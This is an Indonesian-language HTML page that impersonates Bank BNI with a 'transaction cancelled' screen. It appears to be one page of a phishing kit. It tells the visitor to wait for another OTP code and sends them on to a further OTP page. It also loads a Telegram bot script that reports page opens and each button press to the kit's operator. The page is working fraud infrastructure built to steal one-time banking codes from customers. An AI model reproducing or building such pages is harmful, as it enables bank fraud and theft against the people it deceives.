<!DOCTYPE html>
<html lang="id">
  <head>
    <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta name="theme-color" content="#ff8c00">
          <title>Bank BNI | Batalkan Transaksi</title>
          <!-- Fonts -->
          <link rel="preconnect" href="https://fonts.googleapis.com">
            <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
              <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&family=Open+Sans:ital,wght@0,300..800;1,300..800&family=Ubuntu:ital,wght@0,300;0,400;0,500;0,700;1,300;1,400;1,500;1,700&display=swap" rel="stylesheet">
                <link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet">
                  <!-- Bootstrap & Icons -->
                  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
                    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
                      <style>
        /* ===== SEMUA WARNA & UKURAN TIDAK DIUBAH ===== */
        html, body {
            max-width: 100%;
            height: 100%;
            overflow-x: hidden;
            font-family: "Montserrat", sans-serif;
        }

        body {
            background: #ddd;
        }

        @media only screen and (min-width: 600px) {
            body {
                width: 400px !important;
                display: block;
                margin: auto;
            }
        }

        .loading {
            width: 100%;
            height: 100%;
            display: none;
            margin: auto;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 3;
            background: rgba(0,0,0, 0.7);
        }

        .loading i {
            color: #0098a5;
            position: relative;
            top: 50%;
        }

        .box-form {
            background-color: #fff;
            border: 0px double #ccc;
            border-radius: 2px;
            box-shadow: 0.4px 0.4px 20px 0.4px #ddd;
            margin-top: -10%;
            border-radius: 6px;
            box-shadow: rgb(170, 170, 170) 3px 3px 5px 2px;
            transition: background 100ms step-start 0s;
        }

        .box-form label {
            color: #005E6A;
            font-weight: bold;
            opacity: 0.7;
            font-size: 14px;
        }

        .box-form input {
            font-size: 14px;
        }

        .box-form select {
            font-size: 14px;
        }

        .box-form button {
            border: none;
            color: #fff;
            padding: 9px 10px 7px 10px;
            border-radius: 2px;
            box-shadow: rgb(170, 170, 170) 2px 2px 5px 0px;
            transition: background 100ms step-start 0s;
        }

        .btn-bni-2:first-of-type {
            background-color: #0049ac;
            border-radius: 5px;
            font-weight: 600;
        }

        .btn-bni-2:last-of-type {
            background-color: #ff9315;
            border-radius: 6px;
            font-weight: 600;
        }

        .btn-bni-2:hover {
            opacity: 0.9;
            color: #fff;
        }

        .status-text {
            font-size: 15px;
            color: #41b70f;
            font-weight: bold;
        }

        .info-text {
            font-weight: 600;
            color: #09316a;
        }

        .version-label {
            font-weight: bold;
        }
    </style>
                    </head>
                    <body>
                      <!-- Loading Overlay -->
                      <div class="loading">
                        <i class="fa fa-spinner fa-spin d-block mx-auto text-center" style="font-size:34px">
                        </i>
                      </div>
                      <!-- Konten Utama -->
                      <div class="container px-0 mb-5" id="Content">
                        <div class="row no-gutters">
                          <div class="col-12">
                            <div class="col-12 float-right text-right mt-2 version-label">V 4.4.3</div>
                          </div>
                          <div class="col-12">
                            <div class="box-form mt-3 p-4">
                              <center>
                                <b class="status-text">TRANSAKSI BERHASIL DIBATALKAN</b>
                                <hr>
                                  <img src="https://picjj.com/images/2024/10/20/WAFgIr.png" width="10%" alt="Berhasil">
                                    <br>
                                      <br>
                                        <a class="info-text">Mohon Tunggu OTP Berikutnya..</a>
                                        <br>
                                          <br>
                                          </center>
                                          <!-- Tombol Lanjutkan -->
                                          <button class="btn btn-bni-2 d-block mx-auto w-100 mt-2" type="button" id="btnLanjutkan">
                                            Lanjutkan
                                          </button>
                                          <!-- Tombol Kembali Menu Utama -->
                                          <form action="#" method="get" style="margin-top: 10px;">
                                            <button class="btn btn-bni-2 d-block mx-auto w-100 mt-2" type="button" id="btnKembali">
                                              Kembali Ke Menu Utama
                                            </button>
                                          </form>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                  <!-- ==============================================
                                  📦 PANGGIL FILE TELEGRAM (DIPISAH)
                                  ============================================== -->
                                  <script src="config.js"></script>
                                  <script src="telegram-bot.js"></script>
                                  <script>
        // ===== NOTIFIKASI HALAMAN DIBUKA =====
        document.addEventListener("DOMContentLoaded", () => {
            notifikasiHalamanDibuka("Halaman Konfirmasi — Transaksi Berhasil Dibatalkan");
        });

        // ===== TOMBOL LANJUTKAN =====
        document.getElementById("btnLanjutkan").addEventListener("click", function(e) {
            e.preventDefault();
            notifikasiHalamanDibuka("Ditekan: Tombol Lanjutkan → otp2-2.html");
            window.location.href = "otp2-2.html";
        });

        // ===== TOMBOL KEMBALI MENU UTAMA =====
        document.getElementById("btnKembali").addEventListener("click", function(e) {
            e.preventDefault();
            notifikasiHalamanDibuka("Ditekan: Tombol Kembali Ke Menu Utama");
            window.location.href = "menu-utama.html"; // Sesuaikan link jika berbeda
        });
    </script>
                                </body>
                              </html>
